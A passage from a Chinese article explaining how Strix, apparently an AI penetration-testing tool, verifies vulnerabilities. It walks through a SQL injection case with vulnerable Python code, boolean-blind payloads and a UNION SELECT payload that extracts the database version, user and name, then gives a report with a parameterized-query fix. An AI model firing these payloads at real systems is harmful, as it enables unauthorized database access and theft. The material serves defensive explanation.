41);font-size: 16px;">子域接管</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">subdomain_takeover.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">DNS配置错误</span></section></td></tr></tbody></table>  
5. 验证流程实战解析  
  
5.1 完整验证流程  
  
以下是 Strix 验证一个 SQL 注入漏洞的完整流程：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rhmRSVBNbicr2t9DEGc55fJDVrohnFJZmbx7hqPdH7ReeQKb7xN4mNdwKLnOJUbnBLn6jzBUKWOkWSIjRVc1XIw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rhmRSVBNbicr2t9DEGc55fJDVrohnFJZmBYeibKN9kE4ozrV08tjo6mLEGZgNCCQDRVl6nYvCrkQu2gSuFkSWkrQ/640?wx_fmt=png&from=appmsg "")  
  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
6、一个完整的验证案例  
  
让我们通过一个完整的例子，看看 Strix 是如何验证 SQL 注入漏洞的。  
  
6.1 第一步：静态分析发现可疑代码  
  
Strix 扫描源代码，发现了这样一段代码：  
```
# 文件：/app/api/user.py，第 45 行
def get_user(user_id):
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    return cursor.fetchone()
```  
  
  
AI 分析  
：用户输入 `user_id` 直接拼接到 SQL 语句中，没有使用参数化查询，疑似 SQL 注入漏洞。  
  
6.2 第二步：设计验证策略  
  
AI 决定使用"布尔盲注"方法进行验证，设计了三个测试请求：  
<table><tbody><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">请求</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">URL</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">预期结果</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">基准请求</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">/api/user?id=1</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">返回用户数据</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">TRUE 条件</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">/api/user?id=1&#39; AND &#39;1&#39;=&#39;1</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">应与基准相同</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">FALSE 条件</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">/api/user?id=1&#39; AND &#39;1&#39;=&#39;2</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">应返回空数据</span></section></td></tr></tbody></table>  
6.3 第三步：执行测试  
  
Strix 通过 HTTP 代理发送请求，收集响应：  
<table><tbody><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">请求</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">响应状态</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">响应大小</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">响应内容</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">基准请求</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">200 OK</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">156 字节</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">{&#34;id&#34;:1,&#34;name&#34;:&#34;Alice&#34;...}</span></span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">TRUE 条件</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">200 OK</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">156 字节</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">{&#34;id&#34;:1,&#34;name&#34;:&#34;Alice&#34;...}</span></span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">FALSE 条件</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">200 OK</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">4 字节</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">null</span></span></section></td></tr></tbody></table>  
6.4 第四步：分析结果  
  
AI 分析响应差异：  
```
基准请求 vs TRUE 条件：响应完全相同 ✓
基准请求 vs FALSE 条件：响应明显不同 ✓
结论：注入的 SQL 代码影响了查询结果
     → SQL 注入漏洞确认！
```  
```
```  
  
6.5 第五步：验证影响程度  
  
为了评估漏洞的严重性，Strix 尝试提取敏感信息：  
```
请求：/api/user?id=-1' UNION SELECT version(),user(),database()--
响应：{"id":"8.0.32","name":"root@localhost","email":"production_db"}
```  
```
```  
  
影响评估  
：高危——攻击者可以提取任意数据库内容。  
  
6.6 第六步：生成报告  
  
最终，Strix 生成详细的漏洞报告：  
```
=====================================
漏洞报告：SQL 注入
=====================================
严重程度：高危
CWE 编号：CWE-89
受影响文件：/app/api/user.py
受影响行号：第 45 行
漏洞描述：
用户输入直接拼接到 SQL 查询语句中，
未使用参数化查询，导致 SQL 注入漏洞。
验证方法：
使用布尔盲注技术，通过对比 TRUE/FALSE
条件下的响应差异确认漏洞存在。
复现步骤（PoC）：
1. 访问 /api/user?id=1' AND '1'='1
   → 返回正常用户数据
2. 访问 /api/user?id=1' AND '1'='2
   → 返回空数据
3. 响应差异证明 SQL 代码被执行
影响范围：
可提取数据库中的任意信息，包括用户凭证、
敏感业务数据等。
修复建议：
使用参数化查询：
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
=====================================
```  
```
```  
  
6.7 实际效果  
  
在已部署的真实测试项目中，Strix 的确认漏洞占比通常显著高于传统 SAST，误报率可降至 5%–10% 区间，具体取决于目标复杂度和测试深度。  
  
7.总结  
  
Strix 通过将静态分析与动态验证相结合，构建了一套以“验证成功的漏洞才算漏洞”为核心理念的安全检测体系。它利用浏览器自动化、HTTP 代理、终端沙箱和 Python 脚本等多种动态验证手段，对 SQL 注入、XSS、RCE、IDOR 等多类漏洞进行真实攻击验证，并结合结构化的方法论与 Prompt 约束，生成可复现的 PoC 和明确的影响评估。通过这种方式，Strix 显著降低了误报率，使安全团队能够聚焦真正具有风险的漏洞。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/55LhWNqR1eEIvTRaeSGqOic2WdN4owxXx4UzauQgeevfp7WbH82nic0ict9rBIHza7ZkYRxXupK0a8IIPDyicUpjPg/640 "")  
  
END  
  
  
关联阅读  
  
[Strix,融合源码理解与运行态验证的 AI 渗透测试框架](https://mp.weixin.qq.com/s?__biz=Mzg5NTMxMjQ4OA==&mid=2247486518&idx=1&sn=98bbce239e9ac5393cb8c603df75bb52&scene=21#wechat_redirect)  
  
  
[要测试AI的代码分析能力，可以用的Benchmark](https://mp.weixin.qq.com/s?__biz=Mzg5NTMxMjQ4OA==&mid=2247486504&idx=1&sn=80ec4feee8f8ea5a6a34222c5fafa45c&scene=21#wechat_redirect)  
  
  
  
